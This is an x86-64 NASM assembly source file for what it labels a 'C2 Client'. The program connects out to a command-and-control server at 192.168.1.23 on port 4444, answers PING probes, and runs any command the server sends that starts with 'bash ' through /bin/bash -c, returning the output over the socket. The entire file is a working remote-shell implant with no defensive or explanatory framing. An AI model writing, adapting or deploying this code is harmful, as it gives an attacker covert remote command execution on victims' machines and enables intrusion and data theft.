;------------------------------
; client.asm - C2 Client in NASM x64
; Implements ping response and remote command execution
;------------------------------
global _start

section .data
    server_addr:
       dw 2             ; IPv4 address family (AF_INET)
       dw 0x5c11        ; Port 4444 (0x115c in network byte order)
       dd 0x1701a8c0    ; IP address 192.168.1.23 (little-endian format)
       times 8 db 0     ; Padding for sockaddr_in structure
    server_addr_len equ 16

    newline_str       db 10, 0        ; Newline character
    server_msg_prefix db "From server: ", 0  ; Console output prefix
    pong_str          db "PONG", 10   ; PING response (5 bytes incl. newline)

    ; Command execution parameters
    bash_path db "/bin/bash", 0       ; Bash executable path
    arg_c     db "-c", 0              ; Bash -c argument

section .bss
    buf      resb 1024         ; General purpose I/O buffer
    pollfds  resb 2*8          ; Poll structures (socket + stdin monitoring)
    pipefd   resd 2            ; Pipe file descriptors [read, write]

section .text

_start:
    ; Create TCP socket (sys_socket)
    mov rax, 41         ; System call number for socket()
    mov rdi, 2          ; AF_INET (IPv4)
    mov rsi, 1          ; SOCK_STREAM (TCP)
    mov rdx, 0          ; Protocol (auto-select)
    syscall
    mov r12, rax        ; Store socket file descriptor in r12

    ; Connect to C2 server (sys_connect)
    mov rdi, r12        ; Socket fd
    lea rsi, [rel server_addr]  ; Server address structure
    mov rdx, server_addr_len    ; Address structure length
    mov rax, 42         ; connect() system call
    syscall

    ; Initialize pollfd structures
    ; Structure format: 8 bytes (4B fd, 2B events, 2B revents)
    mov rdi, pollfds           ; Start of pollfd array
    mov rcx, 2*8               ; Clear 2 structures (16 bytes)
    xor rax, rax
    rep stosb                  ; Zero-initialize memory

    ; Configure pollfd[0] (server socket monitoring)
    mov qword [pollfds], r12   ; Socket fd
    mov word  [pollfds+4], 1   ; POLLIN event (data to read)

    ; Configure pollfd[1] (STDIN monitoring)
    mov dword [pollfds+8], 0   ; STDIN fd (0)
    mov word  [pollfds+8+4], 1 ; POLLIN event

    mov r13, 2         ; Number of file descriptors to monitor

client_loop:
    ; Wait for events using poll() (sys_poll)
    lea rdi, [pollfds] ; pollfd array
    mov rsi, r13       ; nfds (number of descriptors)
    mov rdx, -1        ; Infinite timeout
    mov rax, 7         ; poll() system call
    syscall
    cmp rax, 0         ; Check for poll errors
    jl client_exit

    xor r14, r14       ; Current pollfd index (0-based)

.poll_loop_client:
    cmp r14, r13       ; Check all monitored descriptors
    jge .after_poll_loop_client

    ; Calculate pollfd structure offset (index * 8 bytes)
    mov rcx, r14
    shl rcx, 3         ; Multiply by 8 (pollfd size)
    lea rbx, [pollfds + rcx]

    ; Check if revents has occurred
    movzx rax, word [rbx+6]  ; revents field offset
    test rax, rax
    jz .next_poll_client

    ; Handle events using call to preserve stack
    cmp r14, 0
    je .handle_server_message_call
    cmp r14, 1
    je .handle_stdin_client_call

.next_poll_client:
    inc r14
    jmp .poll_loop_client

.after_poll_loop_client:
    jmp client_loop

;---------------------------------------------------------------
; Handle incoming server messages
.handle_server_message_call:
    call .handle_server_message
    jmp .next_poll_client

.handle_server_message:
    ; Read from server socket
    mov rdi, r12        ; Socket fd
    lea rsi, [buf]      ; Receive buffer
    mov rdx, 1024       ; Buffer size
    mov rax, 0          ; read() system call
    syscall
    test rax, rax       ; Check for read errors/disconnect
    jle .clear_revents_client
    mov rbx, rax        ; Store received byte count

    ; Display received message (optional debug output)
    lea rdi, [rel server_msg_prefix]
    call print_string
    mov rdi, 1          ; STDOUT
    lea rsi, [buf]
    mov rdx, rbx
    mov rax, 1          ; write() system call
    syscall
    lea rdi, [rel newline_str]
    call print_string

    ; Check for bash command prefix "bash "
    cmp rbx, 5          ; Minimum command length check
    jb .check_ping
    mov eax, dword [buf]
    cmp eax, 0x68736162 ; "bash" in little-endian (ASCII)
    jne .check_ping
    cmp byte [buf+4], 0x20 ; Check space after 'bash'
    jne .check_ping
    call .handle_bash_command
    jmp .clear_revents_client

.check_ping:
    ; Handle PING command
    cmp rbx, 4
    jb .clear_revents_client
    cmp dword [buf], 0x474e4950 ; "PING" in little-endian
    jne .clear_revents_client
    mov rdi, r12        ; Socket fd
    lea rsi, [rel pong_str]
    mov rdx, 5          ; Response length ("PONG\n")
    mov rax, 1          ; write() system call
    syscall

.clear_revents_client:
    ; Reset poll events for socket
    mov word [pollfds+6], 0
    ret

;---------------------------------------------------------------
; Handle local user input from STDIN
.handle_stdin_client_call:
    call .handle_stdin_client
    jmp .next_poll_client

.handle_stdin_client:
    ; Read from STDIN and forward to server
    mov rdi, 0          ; STDIN
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0          ; read()
    syscall
    test rax, rax
    jle .clear_revents_client_stdin
    mov rdi, r12        ; Socket fd
    mov rdx, rax        ; Byte count
    mov rax, 1          ; write()
    syscall

.clear_revents_client_stdin:
    ; Reset poll events for STDIN
    mov word [pollfds+8+6], 0
    ret

;---------------------------------------------------------------
; Execute bash commands and return output
.handle_bash_command:
    lea rdi, [buf+5]    ; Command starts after "bash "
    mov rbx, rdi        ; Store command pointer

    ; Remove trailing newline
    xor rcx, rcx
.remove_newline_loop:
    mov al, [rbx+rcx]
    cmp al, 10          ; LF (newline)
    je .found_newline
    test al, al         ; NUL terminator
    jz .done_remove
    inc rcx
    jmp .remove_newline_loop
.found_newline:
    mov byte [rbx+rcx], 0 ; Replace newline with null terminator

.done_remove:
    ; Create output pipe
    lea rdi, [pipefd]
    mov rsi, 0          ; No flags
    mov rax, 293        ; pipe2() system call
    syscall

    ; Fork process for command execution
    mov rax, 57         ; fork()
    syscall
    test rax, rax
    jz .child_process

    ; Parent process - read command output
    mov edi, [pipefd+4] ; Close write end
    mov rax, 3          ; close()
    syscall

.read_loop_parent:
    mov edi, [pipefd]   ; Read end
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0          ; read()
    syscall
    test rax, rax
    jle .done_read_parent
    mov rdi, r12        ; Socket fd
    mov rdx, rax        ; Byte count
    mov rax, 1          ; write()
    syscall
    jmp .read_loop_parent

.done_read_parent:
    mov edi, [pipefd]   ; Close read end
    mov rax, 3          ; close()
    syscall
    ret

.child_process:
    ; Child process - execute command
    mov edi, [pipefd]   ; Close read end
    mov rax, 3          ; close()
    syscall

    ; Redirect output to pipe
    mov edi, [pipefd+4] ; Write end
    mov esi, 1          ; STDOUT
    mov rax, 33         ; dup2()
    syscall
    mov esi, 2          ; STDERR
    mov rax, 33
    syscall
    mov edi, [pipefd+4] ; Close original write end
    mov rax, 3
    syscall

    ; Prepare execve arguments
    sub rsp, 32         ; Allocate stack space
    mov qword [rsp], bash_path   ; argv[0]
    mov qword [rsp+8], arg_c     ; argv[1]
    mov qword [rsp+16], rbx      ; argv[2] (command)
    mov qword [rsp+24], 0        ; argv[3] (NULL)

    ; Execute command
    mov rdi, bash_path  ; Path to executable
    lea rsi, [rsp]      ; Argument array
    xor rdx, rdx        ; No environment
    mov rax, 59         ; execve()
    syscall

    ; Exit if execve fails
    mov rdi, 1
    mov rax, 60         ; exit()
    syscall

client_exit:
    ; Clean exit
    mov rdi, 0
    mov rax, 60         ; exit()
    syscall

;---------------------------------------------------------------
; Helper: Print null-terminated string
; Input: RDI = string pointer
print_string:
    push rdi
    mov rsi, rdi        ; String address
    xor rcx, rcx        ; Length counter

.find_len:
    cmp byte [rsi+rcx], 0
    je .found_len
    inc rcx
    jmp .find_len

.found_len:
    mov rdx, rcx        ; String length
    mov rdi, 1          ; STDOUT
    mov rax, 1          ; write()
    syscall
    pop rdi
    ret